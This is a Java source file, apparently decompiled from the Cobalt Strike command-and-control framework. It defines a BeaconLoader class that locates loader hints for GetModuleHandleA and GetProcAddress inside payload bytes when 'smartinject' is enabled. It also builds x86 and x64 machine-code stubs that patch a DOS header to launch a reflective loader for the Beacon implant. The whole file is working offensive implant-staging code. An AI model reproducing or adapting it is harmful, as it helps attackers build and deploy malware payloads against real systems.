package pe;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.AssertUtils;
import common.CommonUtils;
import common.Packer;

public class BeaconLoader {
   public static boolean hasLoaderHint(AggressorClient var0, byte[] var1, String var2) {
      return DataUtils.getProfile(var0.getData()).option(".stage.smartinject") ? hasLoaderHintX(var1, var2) : false;
   }

   public static boolean hasLoaderHintX(byte[] var0, String var1) {
      return var0.length > 4096 && getLoaderHint(var0, var1, "GetModuleHandleA") >= 0 && getLoaderHint(var0, var1, "GetProcAddress") >= 0;
   }

   public static int getLoaderHint(byte[] var0, String var1, String var2) {
      AssertUtils.TestSetValue(var1, "x86, x64");
      AssertUtils.TestSetValue(var2, "GetProcAddress, GetModuleHandleA");
      int var3 = -1;
      if ("x86".equals(var1)) {
         if ("GetModuleHandleA".equals(var2)) {
            var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("ÔAAAA"), 1024, var0.length) + 1;
            if (var3 == 0 && var3 < 1) {
               var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("qWvK"), 1024, var0.length);
            }
         } else if ("GetProcAddress".equals(var2)) {
            var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("ØBBBB"), 1024, var0.length) + 1;
            if (var3 == 0 && var3 < 1) {
               var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("KvWq"), 1024, var0.length);
            }
         }
      } else if ("x64".equals(var1)) {
         if ("GetModuleHandleA".equals(var2)) {
            var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("AAAAAAAA"), 1024, var0.length);
            if (var3 < 0) {
               var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("QWVKQWVK"), 1024, var0.length);
            }
         } else if ("GetProcAddress".equals(var2)) {
            var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("BBBBBBBB"), 1024, var0.length);
            if (var3 < 0) {
               var3 = CommonUtils.indexOf(var0, CommonUtils.toBytes("KVWQKVWQ"), 1024, var0.length);
            }
         }
      }

      return var3;
   }

   public static byte[] getDOSHeaderPatchX86(byte[] var0, int var1) {
      return getDOSHeaderPatchX86(var0, var1, 1453503984);
   }

   public static byte[] getDOSHeaderPatchX86(byte[] var0, int var1, int var2) {
      Packer var3 = new Packer();
      var3.little();
      var3.append(var0);
      var3.addByte(232);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(91);
      var3.addByte(137);
      var3.addByte(223);
      var3.addByte(85);
      var3.addByte(137);
      var3.addByte(229);
      var3.addByte(129);
      var3.addByte(195);
      var3.addInt(var1 - (5 + var0.length));
      var3.addByte(255);
      var3.addByte(211);
      var3.addByte(104);
      var3.addInt(var2);
      var3.addByte(104);
      var3.addByte(4);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(87);
      var3.addByte(255);
      var3.addByte(208);
      return var3.getBytes();
   }

   public static byte[] getDOSHeaderPatchX64(byte[] var0, int var1) {
      return getDOSHeaderPatchX64(var0, var1, 1453503984);
   }

   public static byte[] getDOSHeaderPatchX64(byte[] var0, int var1, int var2) {
      Packer var3 = new Packer();
      var3.little();
      var3.append(var0);
      var3.addByte(85);
      var3.addByte(72);
      var3.addByte(137);
      var3.addByte(229);
      var3.addByte(72);
      var3.addByte(129);
      var3.addByte(236);
      var3.addByte(32);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(72);
      var3.addByte(141);
      var3.addByte(29);
      var3.addInt(-18 - var0.length);
      var3.addByte(72);
      var3.addByte(137);
      var3.addByte(223);
      var3.addByte(72);
      var3.addByte(129);
      var3.addByte(195);
      var3.addInt(var1);
      var3.addByte(255);
      var3.addByte(211);
      var3.addByte(65);
      var3.addByte(184);
      var3.addInt(var2);
      var3.addByte(104);
      var3.addByte(4);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(0);
      var3.addByte(90);
      var3.addByte(72);
      var3.addByte(137);
      var3.addByte(249);
      var3.addByte(255);
      var3.addByte(208);
      return var3.getBytes();
   }
}
